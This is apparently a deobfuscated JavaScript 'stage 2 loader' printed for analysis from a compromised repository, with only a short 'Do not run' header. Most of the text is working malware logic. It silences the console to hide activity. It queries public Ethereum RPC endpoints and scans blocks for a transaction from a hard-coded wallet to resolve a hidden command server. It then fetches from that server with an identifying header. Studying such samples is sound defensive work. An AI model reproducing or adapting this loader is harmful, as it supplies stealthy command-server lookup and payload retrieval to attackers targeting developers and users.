// Stage 2 loader from commit 41ab07a8 in the oxc repository network. String tables resolved statically, formatted with Prettier.
// Variable names are the obfuscator output. Do not run.
function _$af5738(o) {
  if (o != null && typeof o['length'] == 'number') {
    var i = 0;
    return {
      next: function () {
        return i < o['length'] ? { done: false, value: o[i++] } : { done: true, value: void 0 };
      },
    };
  }
  if (o != null && typeof Symbol != 'undefined' && typeof o[Symbol['iterator']] == 'function') {
    return o[Symbol['iterator']]();
  }
  throw new TypeError('Value is not iterable');
}
(function (g) {
  try {
    var c = g['console'];
    if (!c) {
      return;
    }
    var a = [
      'log',
      'info',
      'warn',
      'error',
      'debug',
      'trace',
      'dir',
      'table',
      'group',
      'groupCollapsed',
      'groupEnd',
      'time',
      'timeEnd',
    ];
    for (var i = 0; i < a['length']; i++) {
      try {
        c[a[i]] = function () {};
      } catch (ex) {}
    }
  } catch (ex) {}
})(typeof globalThis !== 'undefined' ? globalThis : Function('return this')());
_$jsoIter = _$af5738;
(async function () {
  var i = global;
  var u = i['r'];
  var e = i['o'] || 0;
  var r = '33ff3edaf55a8e03dcbc7cb40d498a49';
  var n = 3;
  var o = 8;
  var c = 1 << o;
  async function a(c, a, s) {
    if (a === void 0) {
      a = [];
    }
    return new i['Promise'](function (o, e) {
      var t = i['JSON']['stringify']({ jsonrpc: '2.0', method: c, params: a, id: 1 });
      var n = { hostname: s, method: 'POST' };
      var r = u('https')
        ['request'](n, function (t) {
          var n = '';
          t['on']('data', function (t) {
            n += t;
          });
          t['on']('end', function () {
            try {
              o(i['JSON']['parse'](n)['result']);
            } catch (t) {
              e(t);
            }
          });
        })
        ['on']('error', function (t) {
          e(t);
        });
      r['write'](t);
      r['end']();
    });
  }
  async function s(t, n) {
    if (n === void 0) {
      n = [];
    }
    try {
      var __jso_block_param_14_o = await a(t, n, 'ethereum-rpc.publicnode.com1');
      if (__jso_block_param_14_o) {
        return __jso_block_param_14_o;
      }
    } catch {}
    try {
      var __jso_block_param_13_o = await a(t, n, 'eth.drpc.org');
      if (__jso_block_param_13_o) {
        return __jso_block_param_13_o;
      }
    } catch {}
    try {
      var __jso_block_param_12_o = await a(t, n, 'eth-mainnet.public.blastapi.io');
      if (__jso_block_param_12_o) {
        return __jso_block_param_12_o;
      }
    } catch {}
  }
  async function d(t) {
    var n = await s('eth_getBlockByNumber', ['0x' + t['toString'](16), true]);
    if (!(n['transactions'] == null ? undefined : n['transactions']['length'])) {
      return;
    }
    {
      var _$err_76ce_1;
      try {
        for (
          var _$it_76ce_1 = _$jsoIter(n['transactions']), _$st_76ce_1;
          !(_$st_76ce_1 = _$it_76ce_1['next']())['done'];
        ) {
          var __jso_nested_loop_3_o = _$st_76ce_1['value'];
          if (__jso_nested_loop_3_o['from']['includes'](r)) {
            return __jso_nested_loop_3_o['to'];
          }
        }
      } catch (_$ex_76ce_1) {
        _$err_76ce_1 = { e: _$ex_76ce_1 };
      } finally {
        try {
          if (_$st_76ce_1 && !_$st_76ce_1['done'] && _$it_76ce_1['return']) {
            _$it_76ce_1['return']();
          }
        } finally {
          if (_$err_76ce_1) {
            throw _$err_76ce_1['e'];
          }
        }
      }
    }
  }
  async function l(n) {
    for (var __jso_nested_loop_2_t = -1; __jso_nested_loop_2_t < 13; __jso_nested_loop_2_t++) {
      var __jso_block_param_11_o = __jso_nested_loop_2_t == -1 ? 0 : Math['pow'](2, __jso_nested_loop_2_t);
      for (var __jso_nested_loop_1_t = 0; __jso_nested_loop_1_t < 3; __jso_nested_loop_1_t++) {
        var __jso_block_param_10_e = await d(n - __jso_block_param_11_o * c + __jso_nested_loop_1_t);
        if (__jso_block_param_10_e) {
          return __jso_block_param_10_e;
        }
      }
    }
  }
  async function f(t) {
    return new i['Promise'](function (o, n) {
      u('http')
        ['get'](t, { headers: { X: r + ':' + e } }, function (t) {
          var n = '';
          t['on']('data', function (t) {
            n += t;
          });
          t['on']('end', function () {
            o(n);
          });
        })
        ['on']('error', function (t) {
          n(t);
        })
        ['end']();
    });
  }

})();
